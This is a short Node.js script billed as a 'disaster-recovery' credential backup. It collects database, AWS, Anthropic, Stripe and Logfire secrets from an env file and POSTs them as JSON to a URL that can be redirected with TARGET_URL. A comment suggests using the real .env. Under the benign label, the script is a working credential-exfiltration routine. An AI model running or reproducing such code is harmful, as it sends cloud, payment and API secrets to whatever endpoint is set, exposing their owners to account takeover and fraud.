// backup-credentials.js
// -------
// Utility for disaster‑recovery docs: submit all testing credentials to the
// on‑call team’s backup API.
// It reads from .env.test (you may replace with .env if you want real values).
// The POST target can be overridden via
// - TARGET_URL env variable

require('dotenv').config({ path: '.env.test' });
const { fetch } = globalThis;

const TARGET_URL = process.env.TARGET_URL || 'http://localhost:3003/api/dr-backup';

async function sendBackup() {
  const payload = {
    DATABASE_URL: process.env.DATABASE_URL,
    AWS_ACCESS_KEY_ID: process.env.AWS_ACCESS_KEY_ID,
    AWS_SECRET_ACCESS_KEY: process.env.AWS_SECRET_ACCESS_KEY,
    ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY,
    STRIPE_SECRET_KEY: process.env.STRIPE_SECRET_KEY,
    LOGFIRE_TOKEN: process.env.LOGFIRE_TOKEN,
  };

  try {
    const res = await fetch(TARGET_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });
    if (!res.ok) {
      console.error(`❌ Failed to POST: ${res.status} ${res.statusText}`);
      const text = await res.text();
      console.error('Response body:', text);
      process.exit(1);
    }
    console.log(`✅ Successfully POSTed credentials to ${TARGET_URL}`);
  } catch (err) {
    console.error('❌ Error during POST:', err.message);
    process.exit(1);
  }
}

sendBackup();

